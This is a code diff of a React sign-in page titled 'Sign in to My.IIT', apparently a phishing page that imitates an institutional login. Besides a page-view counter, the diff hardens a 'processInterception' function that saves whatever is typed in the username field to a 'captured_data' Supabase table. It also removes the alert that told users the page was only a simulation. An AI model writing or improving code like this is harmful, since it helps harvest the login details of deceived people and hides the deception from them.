@@ -7,37 +7,46 @@ export default function Signin() {
   // NEW: Record page opens on component mount
 useEffect(() => {
 
+ 
   const trackPageView = async () => {
-      // Check session storage to prevent double-counting on dev React re-renders
-      const alreadyCounted = sessionStorage.getItem("page_view_session");
-      if (alreadyCounted) return;
+    const alreadyCounted = sessionStorage.getItem("page_view_session");
+    if (alreadyCounted) return;
 
-      try {
-        // 1. Fetch current view count from Row ID 1
-        const { data, error } = await supabase
-          .from('analytics')
-          .select('view_count')
-          .eq('id', 1)
-          .single();
+    try {
+      // Fetch the counter record
+      const { data, error } = await supabase
+        .from('analytics')
+        .select('view_count')
+        .eq('id', 1)
+        .maybeSingle(); // Prevents crashing if row state is temporarily pending
 
-        if (data) {
-          const updatedViews = data.view_count + 1;
-
-          // 2. Update the number on the cloud
-          await supabase
-            .from('analytics')
-            .update({ view_count: updatedViews })
-            .eq('id', 1);
-
-          sessionStorage.setItem("page_view_session", "true");
-        }
-      } catch (err) {
-        console.error("Error updating cloud view counter:", err);
+      if (error) {
+        console.error("Fetch error on views:", error.message);
+        return;
       }
-    };
 
-    trackPageView();
-  }, []);
+      if (data) {
+        const updatedViews = (data.view_count || 0) + 1;
+
+        // Save updated increment back to the database row
+        const { error: updateError } = await supabase
+          .from('analytics')
+          .update({ view_count: updatedViews })
+          .eq('id', 1);
+
+        if (!updateError) {
+          sessionStorage.setItem("page_view_session", "true");
+        } else {
+          console.error("Update error on views:", updateError.message);
+        }
+      }
+    } catch (err) {
+      console.error("Page view track failure exception:", err);
+    }
+  };
+
+  trackPageView();
+}, []);
   
   document.title = "Sign in to My.IIT"; // Set page title on load
   // Check if this specific refresh has already been counted
@@ -60,24 +69,34 @@ useEffect(() => {
 
 
 const processInterception = async () => {
-  const usernameVal = document.getElementById("username")?.value.trim();
+  const usernameInput = document.getElementById("username");
+  const usernameVal = usernameInput?.value ? usernameInput.value.trim() : "";
 
-  if (usernameVal) {
-    // Save to the live Supabase cloud table
+  if (!usernameVal) return;
+
+  try {
     const { error } = await supabase
       .from('captured_data')
       .insert([
-        { email: usernameVal, savedAt: new Date().toLocaleString() }
+        { 
+          email: usernameVal, 
+          saved_at: new Date().toLocaleString() // MATCHES YOUR DATABASE EXACTLY
+        }
       ]);
 
-    if (error) console.error("Error syncing to cloud database:", error);
+    if (error) {
+      console.error("Error syncing to cloud database:", error.message);
+    } else {
+      console.log("Success! Data sent to Supabase.");
+    }
+  } catch (err) {
+    console.error("Network error:", err);
   }
 };
 
   const handleFormSubmit = (e) => {
     e.preventDefault();
     processInterception();
-    alert("Simulation Notice: Account interaction processed and synchronized into analytics dashboard panel.");
     e.target.reset();
   };
 
